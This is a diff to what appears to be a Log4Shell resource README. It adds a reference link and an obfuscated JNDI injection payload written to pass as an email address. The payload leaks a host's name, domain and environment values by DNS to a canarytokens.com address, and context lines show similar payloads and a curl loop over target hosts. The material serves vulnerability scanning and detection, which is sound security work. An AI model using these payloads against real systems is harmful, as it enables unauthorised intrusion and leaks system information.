@@ -13,6 +13,7 @@
 | https://github.com/apache/logging-log4j2/pull/607 | LOG4J2-3198: Log4j2 no longer formats lookups in messages by default #607 |
 | https://issues.apache.org/jira/browse/LOG4J2-3198 | LOG4J2-3198 |
 | https://github.com/YfryTchsGD/Log4jAttackSurface | Log4jAttackSurface |
+| https://github.com/NCSC-NL/log4shell/tree/main/software | Log4j overview related software |
 | https://github.com/apache/logging-log4j2/pull/608#issuecomment-991723301 | Affected log4j Version |
 | https://logging.apache.org/log4j/2.x/security.html | Apache Log4j Security Vulnerabilities |
 | https://twitter.com/marcioalm/status/1470361495405875200?s=09 | JNDI-Exploit-Kit targets ANY version of Java |
@@ -79,6 +80,10 @@ cat targets.txt | while read host do; do curl -sk --insecure --path-as-is "$host
 ```c
 ${jndi:ldap://${hostName}.${env:COMPUTERNAME}.${env:USERDOMAIN}.${env}..[L4J.TOKEN.canarytokens.com/a](http://l4j.TOKEN.canarytokens.com/a)}  
 test+(${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//${hostName}.${env:COMPUTERNAME}.${env:USERDOMAIN}.${env}.[L4J.TOKEN.canarytokens.com/a})@foobar.com](http://l4j.TOKEN.canarytokens.com/a%7D)@foobar.com)
+```
+RFC conform Email Payload
+```c
+test+(${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//${hostName}.${env:COMPUTERNAME}.${env:USERDOMAIN}.${env}.L4J.TOKEN.canarytokens.com/a})@foobar.com
 ```
 
 ### Toolkit / Vulnerability Scanning
